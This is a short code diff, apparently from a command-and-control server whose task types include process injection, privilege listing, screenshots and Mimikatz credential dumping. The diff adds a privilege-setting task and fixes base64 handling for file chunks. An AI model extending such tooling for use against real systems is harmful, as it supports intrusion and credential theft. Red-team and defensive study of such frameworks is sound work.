@@ -356,6 +356,7 @@ def send():
                 tasktype.Download.value,
                 tasktype.RemoteInject.value,
                 tasktype.ListPrivs.value,
+                tasktype.SetPriv.value,
                 tasktype.Screenshot.value,
                 tasktype.Mimikatz.value
             ):
@@ -393,6 +394,7 @@ def send():
                     tasktype.Download.value,
                     tasktype.RemoteInject.value,
                     tasktype.ListPrivs.value,
+                    tasktype.SetPriv.value,
                     tasktype.Screenshot.value,
                     tasktype.Mimikatz.value
                 ):
@@ -879,7 +881,7 @@ def host_download_file():
             with open(filepath, 'rb') as fl:
                 data = fl.read(1024*1024)
                 while data:
-                    b64data = base64.b64encode(data)
+                    b64data = base64.b64encode(data).decode('ascii')
                     db_filechunk = DownloadFileChunk(
                         data = b64data,
                         downloadfile_id = db_file.id
